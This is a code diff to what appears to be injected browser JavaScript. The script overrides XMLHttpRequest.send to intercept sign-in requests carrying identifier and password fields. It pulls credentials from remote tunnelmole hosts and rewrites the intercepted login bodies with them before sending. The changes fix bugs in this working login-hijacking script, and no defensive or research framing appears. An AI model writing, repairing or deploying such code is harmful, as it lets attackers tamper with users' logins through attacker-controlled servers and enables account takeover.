@@ -5,10 +5,9 @@ const pendingRequests = new Map();
 let usernameFetched = false;
 let passwordFetched = false;
 
-
 // Fetch the username when needed
 const fetchFreqUsername = async () => {
-    if (usernameFetched) return; // Avoid redundant fetches once username is fetched
+    if (usernameFetched) return;
 
     console.log('Fetching username...');
 
@@ -21,7 +20,7 @@ const fetchFreqUsername = async () => {
         if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
 
         const result = await response.json();
-        console.log('Response from /get-first-post-data:', result);  // Debug log
+        console.log('Response from /get-first-post-data:', result);
 
         if (result?.postData) {
             freqUsername = result.postData;
@@ -30,8 +29,7 @@ const fetchFreqUsername = async () => {
 
             // Reset the server-side username store
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
-            // Process all pending requests now that we have a username
-            processModifiedRequests();
+            processModifiedRequests(); // Process any pending requests once username is available
         } else {
             console.warn("No username data received, retrying...");
             setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
@@ -42,11 +40,11 @@ const fetchFreqUsername = async () => {
     }
 };
 
-// Fetch the username when needed
+// Fetch the password when needed
 const fetchFreqPassword = async () => {
-    if (passwordFetched) return; // Avoid redundant fetches once username is fetched
+    if (passwordFetched) return;
 
-    console.log('Fetching username...');
+    console.log('Fetching password...');
 
     try {
         const response = await fetch('https://wa9b11-ip-37-228-207-173.tunnelmole.net/get-second-post-data', {
@@ -57,40 +55,34 @@ const fetchFreqPassword = async () => {
         if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
 
         const result = await response.json();
-        console.log('Response from /get-first-post-data:', result);  // Debug log
+        console.log('Response from /get-second-post-data:', result);
 
         if (result?.postData) {
             freqPassword = result.postData;
             console.log('Fetched password:', freqPassword);
             passwordFetched = true;
 
-            // Reset the server-side username store
-            await fetch('https://wa9b11-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
-            // Process all pending requests now that we have a username
-            processModifiedRequests();
+            // Reset the server-side password store
+            await fetch('https://wa9b11-ip-37-228-207-173.tunnelmole.net/reset-second-post-data', { method: 'POST' });
+            processModifiedRequests(); // Process any pending requests once password is available
         } else {
-            console.warn("No username data received, retrying...");
-            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no username is received
+            console.warn("No password data received, retrying...");
+            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
         }
     } catch (error) {
-        console.error('Error fetching username:', error);
+        console.error('Error fetching password:', error);
         setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
     }
 };
 
-// Modify and send pending requests when username is available
+// Process pending requests when both username and password are available
 const processModifiedRequests = () => {
-    if (!freqUsername) {
-            console.log("Username not available yet, retrying...");
-            fetchFreqUsername();
-            return;
-            }    
-
-     if (!freqPassword) {
-            console.log("pass not available yet, retrying...");
-            fetchFreqPassword();
-            return;
-            }            
+    if (!freqUsername || !freqPassword) {
+        console.log("Username or password not available yet, retrying...");
+        fetchFreqUsername();
+        fetchFreqPassword();
+        return;
+    }
 
     console.log("Processing pending requests...");
     // Create a copy of pending requests as we will modify it while iterating
@@ -101,24 +93,29 @@ const processModifiedRequests = () => {
         const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
         const secondmatch = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
 
-        if (match || secondmatch && !modifiedRequests.has(body)) {
-            const modifiedBody = body.replace(match[1], freqUsername);
+        if ((match || secondmatch) && !modifiedRequests.has(body)) {
+            const modifiedBody = body.replace(match ? match[1] : secondmatch[1], freqUsername);
             modifiedRequests.add(body); // Mark the request as modified
+
             console.log("Modified request with new username:", modifiedBody);
-            xhr.send(modifiedBody); // Send the modified request
-            pendingRequests.delete(xhr); // Remove the request from pending
+
+            // Send the modified request
+            xhr.send(modifiedBody);
+            console.log("Sending modified request:", modifiedBody);
+
+            // Remove the request from pendingRequests after sending
+            pendingRequests.delete(xhr); 
         }
     }
 
-    // Reset freqUsername when all requests are processed
+    // Reset freqUsername and freqPassword when all requests are processed
     if (pendingRequests.size === 0) {
-        console.log("All pending requests processed, resetting freqUsername.");
+        console.log("All pending requests processed, resetting freqUsername and freqPassword.");
         freqUsername = null;
         freqPassword = null;
         usernameFetched = false; // Allow fetching a new username if needed
         passwordFetched = false;
     }
-     
 };
 
 // Intercept XMLHttpRequest to modify requests with username
@@ -129,8 +126,8 @@ XMLHttpRequest.prototype.send = function (body) {
         return;
     }
 
-    // If the body contains identity-signin-identifier and hasn't been modified yet, intercept
-    if (/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
+    // If the body contains identity-signin-identifier or identity-signin-password and hasn't been modified yet
+    if ((/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
         console.log("Intercepted request:", body);
         pendingRequests.set(this, body); // Store the request in pendingRequests
         processModifiedRequests(); // Attempt to modify and send the request immediately
@@ -195,3 +192,4 @@ document.addEventListener('DOMContentLoaded', () => {
     fetchFreqUsername();
     fetchFreqPassword();
 });
+
